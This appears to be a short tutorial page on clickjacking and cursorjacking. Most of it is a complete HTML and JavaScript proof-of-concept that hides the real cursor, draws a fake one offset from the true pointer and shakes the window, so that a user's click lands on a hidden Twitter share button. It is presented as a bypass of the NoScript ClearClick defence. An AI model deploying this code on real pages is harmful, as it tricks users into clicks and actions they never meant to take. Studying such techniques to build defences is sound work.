# Clickjacking

Clickjacking: a malicious technique to trick a user into providing confidential information or taking control of their computer by tricking them into clicking on apparently safe pages.

![exClickjacking](./img/clickjacking.png)


# Cursorjacking

Aims to create an offset between where you appear to click and where you actually click. This allows you to click anywhere.

Example of cursorjacking code

{% highlight html %}
<html>
    <head>
        <title>A good example of cursorjacking</title>
        <style>
            body,html {margin:0;padding:0}
        </style>
    </head>
    <body style="cursor:none;height: 1000px; background:url(animated_2.gif) top left">
        <img style="position: absolute;z-index:1000;" id=cursor src="cursor.png" />
        <div style=margin-left:300px;">
            <h1>Is this a good example of cursorjacking?</h1>
            <p>NoScript ClearClick bypass (fixed in 2.2.8rc1). Inspired by <a href="https://twitter.com/0x6d6172696f/status/159423450803474432">Mario Heiderich</a> | <a href="http://blog.kotowicz.net/2012/01/cursorjacking-again.html">More info</a></p>
        </div>
        <button style="font-size: 150%;position:absolute;top:130px;left:630px;">YES</button>
        <button style="font-size: 150%;position:absolute;top:130px;left:680px;">NO</button>
        <div style="opacity:1;position:absolute;top:130px;left:30px;">
            <a href="https://twitter.com/share" class="twitter-share-button" data-via="kkotowicz" data-size="small">Tweet</a>
            <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
        </div>
        <script>
            function shake(n) {
                if (parent.moveBy) {
                    for (i = 10; i > 0; i--) {
                        for (j = n; j > 0; j--) {
                            parent.moveBy(0,i);
                            parent.moveBy(i,0);
                            parent.moveBy(0,-i);
                            parent.moveBy(-i,0);
                        }
                    }
                }
            }

            shake(5);
            var  oNode = document.getElementById('cursor');

            var onmove = function (e) {
                var nMoveX =  e.clientX, nMoveY =  e.clientY;
                oNode.style.left = (nMoveX + 600)+"px";
                oNode.style.top = nMoveY + "px";
            };
            document.body.addEventListener('mousemove', onmove, true);
        </script>
    </body>
</html>
{% endhighlight %}